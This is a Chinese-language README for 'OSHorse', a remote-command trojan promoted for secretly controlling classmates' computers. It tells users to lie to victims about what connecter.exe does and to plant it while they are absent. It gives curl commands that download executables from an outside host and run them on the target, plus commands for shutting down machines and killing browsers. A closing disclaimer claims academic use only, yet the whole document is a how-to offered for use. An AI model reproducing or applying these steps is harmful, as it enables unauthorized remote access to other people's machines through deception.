# OSHorse，轻松控制同学电脑！

## 有关这个项目
最近一直在找机会研究如何破解极域电子教室，结果百度了几下，看到某篇利用电子教室控制同学的教程。

呃，这似乎有点麻烦，不如自己写一个罢…？

来看看这个远程命令程序！

项目地址：https://github.com/HelloOSMe/OSHorse

## 小技巧：
1. 谎称connecter.exe是个利用host加速的程序
2. 谎称输入控制机器的IP地址是要激活程序

当然你在同学不在的时候植入木马是最佳选择！

## 使用方法
1. 在控制机器上下载（链接附在文末）`HorseCommander.exe`并打开（切记，一定要先打开这个软件！）
2. 在目标机器上下载`connecter.exe`，并在程序同一目录下新建文本文档，内容为控制机器的IP地址。双击打开程序，目标机器可能会闪过一个黑框。
3. 回到控制机器，会显示连线者IP地址并显示提示符，您现在可以远程执行命令啦！

TIPS: 这个提示符的界面和cmd不一样，你可以执行`cd .`来查看目标机器上木马的工作目录，输入`help`查看木马内置命令。

坑同学小命令：
```cmd
#关机
shutdown -s -t [时间，单位为秒]
#重启
shutdown -r -t [时间，单位为秒]
#关闭chrome浏览器
taskkill -f -im chrome.exe
#关闭edge浏览器
taskkill -f -im msedge.exe
#弹出计算器
calc
#锁屏
lock
#弹窗
msg [消息]
```

## 使用极域电子教室反控制软件植入木马
本地
```cmd
curl "https://helloosdisk.wdfiles.com/local--files/file:software/HorseCommander.exe" --output ./connecter.exe
ipconfig
```
远程
```cmd
cd %%temp%%/../../../Documents
curl "https://helloosdisk.wdfiles.com/local--files/file:software/connecter.exe" --output ./connecter.exe
echo [你的内网IP]>>connect.txt
./connecter.exe
```
## 下载
[下载HorseCommander.exe(控制)](https://helloosdisk.wdfiles.com/local--files/file:software/HorseCommander.exe)

[下载connecter.exe(目标)](https://helloosdisk.wdfiles.com/local--files/file:software/connecter.exe)

### 免责声明：仅供学术研究使用。对于违反相关法律、造成危害的滥用行为，开发者不负任何责任。
